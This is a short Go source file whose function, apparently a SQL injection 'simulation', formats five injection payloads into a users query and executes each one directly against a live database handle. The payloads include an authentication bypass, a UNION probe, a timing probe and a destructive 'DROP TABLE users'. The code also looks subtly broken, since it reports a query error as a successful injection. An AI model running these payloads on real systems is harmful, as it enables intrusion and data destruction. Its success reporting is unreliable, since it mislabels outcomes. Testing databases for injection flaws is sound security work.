package dbs

import (
	"database/sql"
	"fmt"
)

func SimulateSQLInjection(db *sql.DB) []string {
	var results []string
	payloads := []string{
		"' OR 1=1; --",
		"' UNION SELECT null, null, null; --",
		"'; SELECT IF(1=1, sleep(5), 0); --",
		"'; DROP TABLE users; --",
		"' AND 1=1; --",
	}

	for _, payload := range payloads {
		injectedQuery := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", payload)
		fmt.Printf("Simulating SQL Injection with payload: %s\n", injectedQuery)

		_, err := db.Exec(injectedQuery)
		if err != nil {
			results = append(results, fmt.Sprintf("SQL Injection succeeded with payload: %s\n", payload))
		} else {
			results = append(results, fmt.Sprintf("SQL Injection failed with payload: %s\n", payload))
		}
	}
	return results
}
